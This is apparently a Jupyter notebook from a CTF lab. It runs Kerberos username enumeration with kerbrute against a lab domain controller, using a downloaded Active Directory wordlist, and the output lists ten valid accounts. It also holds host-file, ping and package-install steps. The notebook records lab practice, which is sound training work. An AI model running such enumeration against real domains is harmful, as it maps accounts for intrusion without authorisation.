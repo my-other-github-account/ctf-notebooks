{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e17df893-2947-450d-a92d-422f1dff3aea",
   "metadata": {},
   "outputs": [],
   "source": [
    "!sudo echo 10.10.62.198  CONTROLLER.local >> /etc/hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "fa09393c-8fcc-4764-9156-1f4dd5761f4a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--2021-10-04 17:03:42--  https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt\n",
      "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
      "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
      "HTTP request sent, awaiting response... 200 OK\n",
      "Length: 836 [text/plain]\n",
      "Saving to: ‘User.txt’\n",
      "\n",
      "User.txt            100%[===================>]     836  --.-KB/s    in 0s      \n",
      "\n",
      "2021-10-04 17:03:42 (46.7 MB/s) - ‘User.txt’ saved [836/836]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "0868218b-2c0f-432a-95ad-49396ff6005c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    __             __               __     \n",
      "   / /_____  _____/ /_  _______  __/ /____ \n",
      "  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n",
      " / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n",
      "/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n",
      "\n",
      "Version: dev (n/a) - 10/04/21 - Ronnie Flathers @ropnop\n",
      "\n",
      "2021/10/04 17:03:46 >  Using KDC(s):\u001b[0m\n",
      "2021/10/04 17:03:46 >  \tCONTROLLER.local:88\n",
      "\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t admin1@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t administrator@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t admin2@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t httpservice@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t machine1@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t sqlservice@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t user1@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t user2@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t user3@CONTROLLER.local\u001b[0m\n",
      "\u001b[32m2021/10/04 17:03:46 >  [+] VALID USERNAME:\t machine2@CONTROLLER.local\u001b[0m\n",
      "2021/10/04 17:03:46 >  Done! Tested 100 usernames (10 valid) in 0.026 seconds\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!/root/go/bin/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "1dcb1d2d-ccad-4efb-a5b5-f505d4ec77ba",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING CONTROLLER.local (10.10.62.198) 56(84) bytes of data.\n",
      "64 bytes from CONTROLLER.local (10.10.62.198): icmp_seq=1 ttl=128 time=0.553 ms\n",
      "64 bytes from CONTROLLER.local (10.10.62.198): icmp_seq=2 ttl=128 time=0.692 ms\n",
      "64 bytes from CONTROLLER.local (10.10.62.198): icmp_seq=3 ttl=128 time=0.622 ms\n",
      "64 bytes from CONTROLLER.local (10.10.62.198): icmp_seq=4 ttl=128 time=0.600 ms\n",
      "^C\n",
      "\n",
      "--- CONTROLLER.local ping statistics ---\n",
      "4 packets transmitted, 4 received, 0% packet loss, time 3055ms\n",
      "rtt min/avg/max/mdev = 0.553/0.616/0.692/0.050 ms\n"
     ]
    }
   ],
   "source": [
    "!ping CONTROLLER.local"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "4e79aafa-22c7-4642-b041-bad515c94183",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reading package lists... Done\n",
      "Building dependency tree... Done\n",
      "Reading state information... Done\n",
      "The following NEW packages will be installed:\n",
      "  iputils-ping\n",
      "0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.\n",
      "Need to get 49.8 kB of archives.\n",
      "After this operation, 116 kB of additional disk space will be used.\n",
      "Get:1 http://kali.download/kali kali-rolling/main amd64 iputils-ping amd64 3:20210202-1 [49.8 kB]\n",
      "Fetched 49.8 kB in 0s (113 kB/s)        \u001b[0m\u001b[33m\n",
      "debconf: delaying package configuration, since apt-utils is not installed\n",
      "\n",
      "\u001b7\u001b[0;23r\u001b8\u001b[1ASelecting previously unselected package iputils-ping.\n",
      "(Reading database ... 115199 files and directories currently installed.)\n",
      "Preparing to unpack .../iputils-ping_3%3a20210202-1_amd64.deb ...\n",
      "\u001b7\u001b[24;0f\u001b[42m\u001b[30mProgress: [  0%]\u001b[49m\u001b[39m [..........................................................] \u001b8\u001b7\u001b[24;0f\u001b[42m\u001b[30mProgress: [ 20%]\u001b[49m\u001b[39m [###########...............................................] \u001b8Unpacking iputils-ping (3:20210202-1) ...\n",
      "\u001b7\u001b[24;0f\u001b[42m\u001b[30mProgress: [ 40%]\u001b[49m\u001b[39m [#######################...................................] \u001b8Setting up iputils-ping (3:20210202-1) ...\n",
      "\u001b7\u001b[24;0f\u001b[42m\u001b[30mProgress: [ 60%]\u001b[49m\u001b[39m [##################################........................] \u001b8\u001b7\u001b[24;0f\u001b[42m\u001b[30mProgress: [ 80%]\u001b[49m\u001b[39m [##############################################............] \u001b8\n",
      "\u001b7\u001b[0;24r\u001b8\u001b[1A\u001b[J"
     ]
    }
   ],
   "source": [
    "!sudo apt install iputils-ping"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf760efd-6544-47dc-8099-262b194a33a2",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
